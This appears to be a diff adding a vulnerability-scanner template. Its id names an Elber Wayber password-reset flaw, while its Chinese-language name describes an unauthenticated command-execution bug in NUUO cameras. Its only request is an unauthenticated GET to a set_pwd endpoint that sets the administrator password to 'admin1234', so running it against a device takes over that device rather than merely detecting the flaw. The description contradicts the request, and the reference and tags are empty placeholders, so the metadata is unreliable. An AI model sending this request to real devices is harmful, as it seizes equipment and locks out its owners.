@@ -1,0 +1,18 @@
+id: Elber-Wayber-setpwd-reastpasswd
+info:
+  name: NUUO摄像头是中国台湾NUUO公司旗下的一款网络视频记录器，NUUO摄像头debugging_center_utils存在未授权命令执行漏洞，攻击者可以获取服务器权限
+  author: wangzong
+  severity: high
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}//json_data/set_pwd?lev=2&pass=admin1234"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Apply'
